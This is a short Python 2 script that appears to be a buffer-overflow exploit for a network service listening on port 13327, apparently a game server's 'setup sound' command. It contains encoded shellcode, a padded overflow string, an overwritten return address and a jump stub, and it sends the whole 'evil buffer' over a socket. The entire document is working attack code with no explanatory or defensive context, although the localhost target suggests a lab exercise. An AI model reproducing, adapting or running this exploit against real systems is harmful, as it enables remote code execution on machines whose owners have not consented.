#!/usr/bin/python
import socket

shellcode = ("\xbf\x45\x48\xaa\xe1\xd9\xc6\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x14\x31\x7d\x14\x03\x7d\x14\x83\xc5\x04\xa7\xbd\x9b\x3a\xd0"
"\xdd\x8f\xff\x4d\x48\x32\x89\x90\x3c\x54\x44\xd2\x66\xc7\x04"
"\xba\x9a\xf7\xb9\x66\xf1\xe7\xe8\xc6\x8c\xe9\x61\x80\xd6\x24"
"\xf5\xc5\xa6\xb2\x45\xd1\x98\xdd\x64\x59\x9b\x91\x11\x94\x9c"
"\x41\x84\x4c\xa2\x3d\xfa\x10\x95\xc4\xfc\x78\x09\x18\x8e\x10"
"\x3d\x49\x12\x89\xd3\x1c\x31\x19\x7f\x96\x57\x29\x74\x65\x17")
host = "127.0.0.1"
ret = "\x97\x45\x13\x08"
crash= shellcode + "\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"*2

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."
s.connect((host, 13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()
print "[*] Payload Sent !"
